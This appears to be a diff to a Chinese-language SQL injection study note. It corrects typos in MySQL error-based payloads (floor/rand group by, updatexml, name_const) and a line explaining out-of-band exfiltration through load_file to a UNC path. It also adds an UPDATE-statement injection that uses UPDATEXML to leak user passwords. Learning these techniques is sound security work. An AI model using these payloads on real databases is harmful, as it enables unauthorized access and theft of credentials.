@@ -210,8 +210,9 @@ select * from users where id="-1" or 5<length(database())<10 or sleep(1);
 
 ```sql
 Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a; -- error:ERROR 1062 (23000): Duplicate entry '::root@localhost::1' for key 'group_key'
-# 注意(elect user())的括号
-select count(*) from information_schema.tables group by concat( user(),floor(rand(0)*2));
+# 注意(select user())的括号
+
+select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2));
 select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2))    -- 这里没有用到information_schema
 select min(@a:=1) from information_schema.tables group by concat(user(),@a:=(@a+1)%2)
 # 以上关键在于floor() group by concat()，报错的具体原因网上有很多解释，但是鲜有解答清楚的，注意需要报错回显的内容可以用(select ...)，但是select无法使用group_concat显示一整个字段（这样不会报错），只能使用limit一行一行得到结果
@@ -228,7 +229,7 @@ select updatexml(1,concat(0x7e,(select @@version),0x7e),1) -- 三个参数
 # 注意这里的报错输出有长度限制
 
 select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
-# 函数name_const(字段名，字段值) 等同于  字段值 as 字段名这里用重复的字段名报错，字段值为字符串，字段值为常量值。
+# 函数name_const(字段名，字段值) 等同于  字段值 as 字段名这里用重复的字段名报错，字段名为字符串，字段值为常量值。
 # select NAME_CONST(version(),1),NAME_CONST(version(),1)需作为子表，name_const无法以select的结果作为参数，与前面的不同
 # 三点需要注意：1，报错的原因是(select NAME_CONST(version(),1),NAME_CONST(version(),1))x产生的临时表；2，临时表的产生必须要有(select ...)x或者(select ...) as x的语法，仅有select是不行的，必须给其命名；3，使用name_const(字符串,值)的必要性，name_const()的作用是将字符串作为字段名，值作为字段下的一个值，字符串这里就可以使用一些函数或者变量，在报错的时候就会直接回显这个函数或者变量的字符串。但是(select version(),version())x这种却不行，这个表确实会因为字段重复而报错，但是产生的这个表的字段名是version();
 ```
@@ -237,7 +238,7 @@ select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
 
 #### OOB注入
 
-* 基本原理：OOB即使Out-Of-Band 带外通道技术，用于攻击者通过另一种方式确认和利用没有直接回显的漏洞。一次成功的OOB攻击基于 有漏洞的系统 和 外围防火墙的出站策略。对于SQL注入无法进行SQl盲注时，可以让数据库向我们所控制的服务器（例如DNS服务器）发起请求，我们通过查看服务器上的请求记录，来判断是否注入成功。	例如，使用mysql中的load_file(concat()"\\\\\\\",(select database()),".UNC地址"))携带敏感信息发起对某个unc地址的请求。UNC路径只有Windows下有，所以在linux下无法获取数据。
+* 基本原理：OOB即使Out-Of-Band 带外通道技术，用于攻击者通过另一种方式确认和利用没有直接回显的漏洞。一次成功的OOB攻击基于 有漏洞的系统 和 外围防火墙的出站策略。对于SQL注入无法进行SQl盲注时，可以让数据库向我们所控制的服务器（例如DNS服务器）发起请求，我们通过查看服务器上的请求记录，来判断是否注入成功。	例如，使用mysql中的load_file(concat("\\\\\\\",(select database()),".UNC地址"))携带敏感信息发起对某个unc地址的请求。UNC路径只有Windows下有，所以在linux下无法获取数据。
 
   Oracle下有函数URL_HTTP.REQUEST进行带外注入。
 
@@ -348,6 +349,20 @@ insert into users(username, password) values
 ![image-20230824232100970](.\images\image-20230824232100970.png)
 
 #### limit注入
+
+### 关于insert、update、delete的注入
+
+这些注入与select注入的区别主要在于不能使用union注入、无法写文件上。
+
+一些trick：
+
+* update双查询实现报错注入：
+
+![img](.\images\update、insert、delete注入.md)
+
+这个语句并没有报错出我们想要的字段，因为update users与select from users冲突了，也就是这两个表不相同，这个问题可以通过双查询解决
+
+UPDATE user SET pwd='666666' OR UPDATEXML(1,CONCAT(0x7e,(SELECT CONCAT_WS(':',id,NAME,pwd)FROM (SELECT id,NAME,pwd FROM user)UUU LIMIT 0,1),0x7e),0)OR ''WHERE id=1;
 
 ## 第三部分 过滤和绕过
 
